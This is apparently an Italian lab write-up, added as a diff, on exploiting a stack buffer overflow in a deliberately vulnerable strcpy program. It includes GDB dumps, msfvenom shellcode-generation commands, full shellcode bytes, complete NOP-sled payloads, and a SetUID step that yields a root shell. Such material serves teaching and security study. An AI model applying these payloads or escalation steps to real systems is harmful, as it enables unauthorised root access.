@@ -1,0 +1,306 @@
+Abbiamo il seguente codice che contiene una chiamata a una funzione vulnerabile (strcpy, da string.h),
+la quale scrive in un buffer di memoria senza fare controlli sulla dimensione dei dati.
+
+#include <stdio.h>
+#include <string.h>
+
+4       void vuln_function(char *input){
+5               char buff[200];                 // local variable (buffer)
+6               strcpy(buff, input);            // vulnerable function - copies into buffer without controls
+7       }
+8
+9       int main(int argc, char *argv[]){
+10              if (argc != 2) return 1;        // check on args passed to the program
+11              vuln_function(argv[1]);         // call to vulnerable function
+12              return 0;                       // reaches only if no buffer overflow occured
+13      }
+
+--Makefile per compilazione, disabilitazione ASLR e pulizia--
+
+Dal GDB, apriamo l'eseguibile bin/vuln dopo aver compilato con make e disassembliamo
+
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08049180 <+0>:     push   %ebp
+   0x08049181 <+1>:     mov    %esp,%ebp
+   0x08049183 <+3>:     cmpl   $0x2,0x8(%ebp)
+   0x08049187 <+7>:     je     0x8049190 <main+16>
+   0x08049189 <+9>:     mov    $0x1,%eax
+   0x0804918e <+14>:    jmp    0x80491a6 <main+38>
+   0x08049190 <+16>:    mov    0xc(%ebp),%eax
+   0x08049193 <+19>:    add    $0x4,%eax
+   0x08049196 <+22>:    mov    (%eax),%eax
+   0x08049198 <+24>:    push   %eax
+   0x08049199 <+25>:    call   0x8049162 <vuln_function>
+   0x0804919e <+30>:    add    $0x4,%esp
+   0x080491a1 <+33>:    mov    $0x0,%eax
+   0x080491a6 <+38>:    leave
+   0x080491a7 <+39>:    ret
+End of assembler dump.
+(gdb) disas vuln_function
+Dump of assembler code for function vuln_function:
+   0x08049162 <+0>:     push   %ebp
+   0x08049163 <+1>:     mov    %esp,%ebp
+   0x08049165 <+3>:     sub    $0xc8,%esp
+   0x0804916b <+9>:     push   0x8(%ebp)
+   0x0804916e <+12>:    lea    -0xc8(%ebp),%eax
+   0x08049174 <+18>:    push   %eax
+   0x08049175 <+19>:    call   0x8049040 <strcpy@plt>
+   0x0804917a <+24>:    add    $0x8,%esp
+   0x0804917d <+27>:    nop
+   0x0804917e <+28>:    leave
+   0x0804917f <+29>:    ret
+End of assembler dump.
+
+1) Alla riga main+25 abbiamo la call a vuln_function, nella quale usiamo la strcpy.
+3) Alla riga vuln_function+3 vediamo "sub $0xc8, %esp" che alloca i 200 byte del buffer richiesti nello stack.
+
+NOTA: Questa sintassi potrebbe non essere uguale ovunque, cambia tra Intel e AT&T.
+
+2) Nelle prime due rige della funzione vuln_function abbiamo il preludio della funzione. Il registro %ebp viene
+salvato nello stack con una push, successivamente spostiamo in ebp il valore di esp (base del nuovo frame).
+
+4) Il layout dello stack a questo punto sarà:
+
+[indirizzi minori (top dello stack)] <- [buffer] [saved %ebp] [return addr] [parametri] -> [main]
+
+
+****************************************************DA TOGLIERE**************************************************************
+
+unsigned char buf[] = 
+\xd9\xe5\xd9\x74\x24\xf4\xb8\xe1\x2d\xdc\x58\x5d\x29\xc9\xb1\x0d\x31\x45\x17\x03\x45\x17\x83\x0c\xd1\x3e\xad\xa4\x21\xe7\xd7\x6a\x50\x7f\xc5\xe9\x15\x98\x7d\xc2\x56\x0f\x7e\x74\xb6\xad\x17\xea\x41\xd2\xba\x1a\x5c\x15\x3b\xda\x70\x77\x52\xb4\xa1\x0d\xd7\x20\x9e\xdc\x7e\xc3\xde\x49\xd2\xaa\x3e\xb8\x54
+
+unsigned char buf[] = 
+"\xba\xf5\xc4\x2c\x05\xdb\xcc\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x0c\x31\x56\x12\x83\xee\xfc\x03\xa3\xca\xce\xf0\x21\xd8\x56\x62\xe7\xb8\x0e\xb9\x64\xcc\x28\xa9\x45\xbd\xde\x2a\xf1\x6e\x7d\x42\x6f\xf8\x62\xc6\x87\xf3\x64\xe7\x57\x2b\x07\x8e\x39\x1c\xbd\x23\xad\x62\x16\x97\xa4\x82\x55\x97";
+
+
+******************************************************************************************************************************
+
+
+
+Per fare un test, proviamo a inserire come input una stringa composta da 200 "A", 4 "B", 2 "C" e 2 "D",
+che hanno rispettivamente i valori ASCII 0x41 0x42 0x43 0x44. Se i calcoli sono giusti, dovremmo ricevere un
+SIGSEGV al ritorno dalla vuln_function con indirizzo 0x4444434 (le "D" e le "C" sono invertire per endianess)
+
+(gdb) run $(python2 -c 'print("A" * 200 + "BBBB" + "CCDD")')
+Program received signal SIGSEGV, Segmentation fault.
+0x44444343 in ?? ()
+
+Dal dump della memoria vediamo
+
+(gdb) info register
+eax            0xbfffede4          -1073746460
+ecx            0x514cc2ca          1363985098
+edx            0xbfffeee0          -1073746208
+ebx            0xb7e23e34          -1209909708
+esp            0xbfffeddc          0xbfffeddc
+ebp            0xbfffeeac          0xbfffeeac
+esi            0xbfffef80          -1073746048
+edi            0xb7ffeb80          -1207964800
+eip            0x8049175           0x8049175 <vuln_function+19>
+eflags         0x286               [ PF SF IF ]
+cs             0x73                115
+ss             0x7b                123
+ds             0x7b                123
+es             0x7b                123
+fs             0x0                 0
+gs             0x33                51
+
+
+(gdb) x/100x $esp-100
+0xbfffed78:     0xb7c09a80      0x00000008      0xb7ffefd8      0x00000207
+0xbfffed88:     0x0804825c      0x0804c004      0x08048300      0x000002d3
+0xbfffed98:     0xb7c16c40      0xb7c0de00      0xb7cb7e00      0xbfffee00
+0xbfffeda8:     0x00000000      0x00000000      0xb7e23e34      0xbfffef80
+0xbfffedb8:     0xb7ffeb80      0xbfffeeac      0xb7fddec0      0xbfffeee0
+0xbfffedc8:     0xb7cb7e00      0xb7e23e34      0xbfffef80      0xb7ffeb80
+0xbfffedd8:     0x0804917a      0xbfffede4      0xbffff174      0x41414141
+0xbfffede8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffedf8:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee08:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee18:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee28:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee38:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee48:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee58:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee68:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee78:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee88:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffee98:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffeea8:     0x41414141      0x42424242      0x44444343      0xbffff100
+0xbfffeeb8:     0x00000000      0xb7c23c65      0x00000002      0xbfffef74
+0xbfffeec8:     0xbfffef80      0xbfffeee0      0xb7e23e34      0x0804907d
+0xbfffeed8:     0x00000002      0xbfffef74      0xb7e23e34      0xbfffef80
+0xbfffeee8:     0xb7ffeb80      0x00000000      0x2ae908da      0x514cc2ca
+0xbfffeef8:     0x00000000      0x00000000      0x00000000      0xb7ffeb80
+
+Si vede che il valore della word esattamente sopra il saved ebp, che sarebbe il return address, è proprio
+0x44444343, ovvero "CCDD".
+
+Questo conferma che il layout dello stack è quello che ci aspettavamo.
+Ora il prossimo passo è progettare il payload, che sarà fatto da
+NOP SLED + SHELLCODE + RETURN ADDRESS
+
+Partiamo dallo shellcode, che produciamo con msfvenom così da poterlo creare direttamente senza
+byte che generano problemi come il byte 0x00, perchè la strcpy si ferma al carattere '\0'.
+
+msfvenom -p linux/x86/exec CMD=/bin/sh -e x86/shikata_ga_nai -b '\x00' -f c
+
+"\xdb\xda\xbb\x5b\xa4\x86\xbc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x0b\x83\xef\xfc\x31\x5f\x16\x03\x5f\x16\xe2\xae\xce\x8d\xe4\xc9\x5d\xf4\x7c\xc4\x02\x71\x9b\x7e\xea\xf2\x0c\x7e\x9c\xdb\xae\x17\x32\xad\xcc\xb5\x22\xa5\x12\x39\xb3\x99\x70\x50\xdd\xca\x07\xca\x21\x42\xbb\x83\xc3\xa1\xbb"
+
+A questo punto, dei nostri 200 byte di buffer 70 sono occupati dallo shellcode. Subito dopo lo shellcode inseriamo un return address spurio per effettuare un primo test volto a inviduare l'indirizzo con cui andare a sovrascrivere il return address. Subito prima dello shellcode inseriamo i rimanenti byte di NOP Sled.
+
+(gdb) break *vuln_function+24
+Breakpoint 1 at 0x804917a: file src/vuln.c, line 6.
+(gdb) run $(python2 -c 'print("\x90" * 98 + "\xdb\xda\xbb\x5b\xa4\x86\xbc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x0b\x83\xef\xfc\x31\x5f\x16\x03\x5f\x16\xe2\xae\xce\x8d\xe4\xc9\x5d\xf4\x7c\xc4\x02\x71\x9b\x7e\xea\xf2\x0c\x7e\x9c\xdb\xae\x17\x32\xad\xcc\xb5\x22\xa5\x12\x39\xb3\x99\x70\x50\xdd\xca\x07\xca\x21\x42\xbb\x83\xc3\xa1\xbb" + "AAAA" * 10)')
+Starting program: /home/kali/Desktop/buff/bin/vuln $(python2 -c 'print("\x90" * 98 + "\xdb\xda\xbb\x5b\xa4\x86\xbc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x0b\x83\xef\xfc\x31\x5f\x16\x03\x5f\x16\xe2\xae\xce\x8d\xe4\xc9\x5d\xf4\x7c\xc4\x02\x71\x9b\x7e\xea\xf2\x0c\x7e\x9c\xdb\xae\x17\x32\xad\xcc\xb5\x22\xa5\x12\x39\xb3\x99\x70\x50\xdd\xca\x07\xca\x21\x42\xbb\x83\xc3\xa1\xbb" + "AAAA" * 10)')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x0804917a in vuln_function (input=0xbffff100 "") at src/vuln.c:6
+6               strcpy(buff, input);            // vulnerable function - copies into buffer without controls
+(gdb) x/100x $esp-100
+0xbfffed78:     0xb7c09a80      0x00000008      0xb7ffefd8      0x00000207
+0xbfffed88:     0x0804825c      0x0804c004      0x08048300      0x000002d3
+0xbfffed98:     0xb7c16c40      0xb7c0de00      0xb7cb7e00      0xbfffee00
+0xbfffeda8:     0x00000000      0x00000000      0xb7e23e34      0xbfffef80
+0xbfffedb8:     0xb7ffeb80      0xbfffeeac      0xb7fddec0      0xbfffeee0
+0xbfffedc8:     0xb7cb7e00      0xb7e23e34      0xbfffef80      0xb7ffeb80
+0xbfffedd8:     0x0804917a      0xbfffede4      0xbffff174      0x90909090
+0xbfffede8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffedf8:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee08:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee18:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee28:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee38:     0x90909090      0x90909090      0x90909090      0xdadb9090
+0xbfffee48:     0x86a45bbb      0x2474d9bc      0xc92b5ff4      0xef830bb1
+0xbfffee58:     0x165f31fc      0xe2165f03      0xe48dceae      0x7cf45dc9
+0xbfffee68:     0x9b7102c4      0x0cf2ea7e      0xaedb9c7e      0xccad3217
+0xbfffee78:     0x12a522b5      0x7099b339      0x07cadd50      0xbb4221ca
+0xbfffee88:     0xbba1c383      0x41414141      0x41414141      0x41414141
+0xbfffee98:     0x41414141      0x41414141      0x41414141      0x41414141
+0xbfffeea8:     0x41414141      0x41414141      0x41414141      0xbffff100
+0xbfffeeb8:     0x00000000      0xb7c23c65      0x00000002      0xbfffef74
+0xbfffeec8:     0xbfffef80      0xbfffeee0      0xb7e23e34      0x0804907d
+0xbfffeed8:     0x00000002      0xbfffef74      0xb7e23e34      0xbfffef80
+0xbfffeee8:     0xb7ffeb80      0x00000000      0x77ccc4c0      0x0c690ed0
+0xbfffeef8:     0x00000000      0x00000000      0x00000000      0xb7ffeb80
+
+(gdb) info register
+eax            0xbfffede4          -1073746460
+ecx            0x4b4e41ff          1263419903
+edx            0x4c4f4300          1280262912
+ebx            0xb7e23e34          -1209909708
+esp            0xbfffeddc          0xbfffeddc
+ebp            0xbfffeeac          0xbfffeeac
+esi            0xbfffef80          -1073746048
+edi            0xb7ffeb80          -1207964800
+eip            0x804917a           0x804917a <vuln_function+24>
+eflags         0x246               [ PF ZF IF ]
+cs             0x73                115
+ss             0x7b                123
+ds             0x7b                123
+es             0x7b                123
+fs             0x0                 0
+gs             0x33                51
+
+
+L'attuale $ebp (che punta al saved ebp che si trova alla base del frame della funzione) è all'indirizzo 0xbfffeeax, subito sopra nello stack c'è il return address che è stato sovrascritto con \x41. Ora andiamo a sostituire le A con gli indirizzi (messi con la corretta endianess) in cui c'è la NO OP SLED. prendiamo ad esempio 0xbfffedf8. Rieseguiamo il test con il comando
+
+
+run $(python2 -c 'print("\x90" * 98 + "\xdb\xda\xbb\x5b\xa4\x86\xbc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x0b\x83\xef\xfc\x31\x5f\x16\x03\x5f\x16\xe2\xae\xce\x8d\xe4\xc9\x5d\xf4\x7c\xc4\x02\x71\x9b\x7e\xea\xf2\x0c\x7e\x9c\xdb\xae\x17\x32\xad\xcc\xb5\x22\xa5\x12\x39\xb3\x99\x70\x50\xdd\xca\x07\xca\x21\x42\xbb\x83\xc3\xa1\xbb" + "\xf8\xed\xff\xbf" * 10)')
+
+Starting program: /home/kali/Desktop/buff/bin/vuln $(python2 -c 'print("\x90" * 98 + "\xdb\xda\xbb\x5b\xa4\x86\xbc\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x0b\x83\xef\xfc\x31\x5f\x16\x03\x5f\x16\xe2\xae\xce\x8d\xe4\xc9\x5d\xf4\x7c\xc4\x02\x71\x9b\x7e\xea\xf2\x0c\x7e\x9c\xdb\xae\x17\x32\xad\xcc\xb5\x22\xa5\x12\x39\xb3\x99\x70\x50\xdd\xca\x07\xca\x21\x42\xbb\x83\xc3\xa1\xbb" + "\xf8\xed\xff\xbf" * 10)')
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+process 22929 is executing new program: /usr/bin/dash
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
+[Detaching after vfork from child process 22933]
+$ 
+
+Viene aperta una nuova shell, in cui possiamo eseguire comandi esterni al GDB.
+
+Ora ci spostiamo fuori dal GDB per vedere se l'exploit funziona anche li. Come era prevedibile, l'indirizzo esatto non funziona poichè ci possono essere piccoli sfasamenti tra l'esecuzione nell'ambiente del debugger e l'esecuzione
+diretta nella shell. Per risolvere la cosa, abilitiamo il core dump per vedere all'esterno del GDB quale indirizzo ci fa "cadere" in mezzo alla nostra no op sled
+
+./bin/vuln $(python2 src/exploit.py)
+zsh: segmentation fault (core dumped)  ./bin/vuln
+
+carichiamo il core con gdb ./bin/vuln core
+
+(gdb) info register
+eax            0xbfffee0a          -1073746422
+ecx            0x43ffffff          1140850687
+edx            0x4300bfff          1124122623
+ebx            0xb7e20234          -1209925068
+esp            0xbfffef04          0xbfffef04
+ebp            0xbfffedf8          0xbfffedf8
+esi            0xbfffefd0          -1073745968
+edi            0xb7ffeb80          -1207964800
+eip            0xbfffedc4          0xbfffedc4
+eflags         0x10297             [ CF PF AF SF IF RF ]
+cs             0x73                115
+ss             0x7b                123
+ds             0x7b                123
+es             0x7b                123
+fs             0x0                 0
+gs             0x33                51
+
+Esaminiamo la memoria per vedere a che indirizzo inizia la no op sled:
+
+0xbfffed94:     0x0804827e      0xb7fffa30      0x00000002      0xb7fdbea2
+0xbfffeda4:     0x0804827e      0xb7fffa30      0xbfffedec      0xb7fffc08
+0xbfffedb4:     0xb7fc4740      0x00000001      0xb7ca0be5      0xb7fdc002
+0xbfffedc4:     0xb7fc4410      0xb7c09a80      0x00000008      0xb7ffefd8
+0xbfffedd4:     0x00000207      0x0804825c      0x0804c004      0x08048300
+0xbfffede4:     0x000002d3      0xb7c16c40      0xb7c0de00      0xb7cb7e00
+0xbfffedf4:     0xbfffee50      0x00000000      0x00000000      0xb7e23e34
+0xbfffee04:     0xbfffefd0      0xb7ffeb80      0xbfffeefc      0xb7fddec0
+0xbfffee14:     0xbfffef30      0xb7cb7e00      0xb7e23e34      0xbfffefd0
+0xbfffee24:     0xb7ffeb80      0x0804917a      0xbfffee34      0xbffff1aa
+0xbfffee34:     0x90909060      0x90909090      0x90909090      0x90909090
+0xbfffee44:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee54:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee64:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee74:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee84:     0x90909090      0x90909090      0x90909090      0x90909090
+0xbfffee94:     0xdadb9090      0x86a45bbb      0x2474d9bc      0xc92b5ff4
+0xbfffeea4:     0xef830bb1      0x165f31fc      0xe2165f03      0xe48dceae
+0xbfffeeb4:     0x7cf45dc9      0x9b7102c4      0x0cf2ea7e      0xaedb9c7e
+0xbfffeec4:     0xccad3217      0x12a522b5      0x7099b339      0x07cadd50
+0xbfffeed4:     0xbb4221ca      0xbba1c383      0xbfffedf8      0xbfffedf8
+0xbfffeee4:     0xbfffedf8      0xbfffedf8      0xbfffedf8      0xbfffedf8
+0xbfffeef4:     0xbfffedf8      0xbfffedf8      0xbfffedf8      0xbfffedf8
+0xbfffef04:     0xbffff100      0x00000000      0xb7c23c65      0x00000002
+0xbfffef14:     0xbfffefc4      0xbfffefd0      0xbfffef30      0xb7e23e34
+
+ci basta sostituire con un indirizzo che ci porti dentro la sled, ad esempio 0xbfffee44 (scritto con la giusta endianess).
+Da notare che la distanza in memoria tra l'indirizzo che funzionava nel GDB e quello reale è di qualche decina di byte.
+
+./bin/vuln $(python2 src/exploit.py)
+
+$ 			<--- ABBIAMO UNA NUOVA SHELL
+
+L'exploit è andato a buon fine e abbiamo aperto una nuova shell.
+Una volta completato l'attacco di buffer overflow "normale" il passo successivo per la privilege escalation è iniettare e far eseguire uno shellcode specifico. Mentre uno shellcode comune si limita a dare una shell con i permessi dell'utente corrente, quello per la privilege escalation deve sfruttare il fatto che il programma vulnerabile è un'applicazione SetUID di proprietà di root. Il codice deve quindi eseguire due chiamate di sistema cruciali: setreuid() e execve(). La syscall setreuid() è fondamentale perché imposta l'ID utente (UID) e l'ID utente effettivo (EUID) del processo a 0, che è l'ID dell'utente root, consolidando così i privilegi elevati. Senza questa chiamata, la successiva esecuzione di una shell non manterrebbe i privilegi di root, poiché il sistema operativo assegna i permessi della shell in base all'ID utente reale. Dopo aver ottenuto i permessi di root, lo shellcode chiama execve("/bin/sh", NULL, NULL) per avviare una shell di comando con questi nuovi privilegi. Questo permette di avere una shell che esegue comandi con l'autorità di root. In pratica, questo processo trasforma un attacco da semplice esecuzione di codice in una vera e propria scalata dei privilegi, ottenendo il controllo completo del sistema.
+
+La prima cosa da fare e impostare il SUID e rendere l'eseguibile di proprietà di root.
+
+sudo chown root ./bin/vuln
+sudo chmod u+s ./bin/vuln
+
+Successivamente prendiamo uno shellcode nuovo che rispetti i requisiti precedentemente descritti, e aggiustiamo di conseguenza la dimensione della NOP SLED visto che questo shellcode ha una dimensione diversa da quello precedente.
+
+msfvenom -p linux/x86/exec CMD="/bin/zsh" PrependSetreuid=true PrependSetuid=true PrependSetgid=true -f c -e x86/shikata_ga_nai -b '\x00'
+
+Eseguiamo quindi il codice vulnerabile con questo input (sempre tramite script python):
+
+./bin/vuln $(python2 src/exploit.py)
+
+root@kali:/home/kali/Desktop/buff# whoamihoami                                                                                      
+root
+
+L'output del terminale è buggato nel I/O per problemi di variabili di ambiente (ci basta fare 'export TERM=xterm' per risolvere così da avere una corretta gestione delle escape sequence ecc.) ma funziona, abbiamo ottenuto una shell con privilegi di root.
+
+
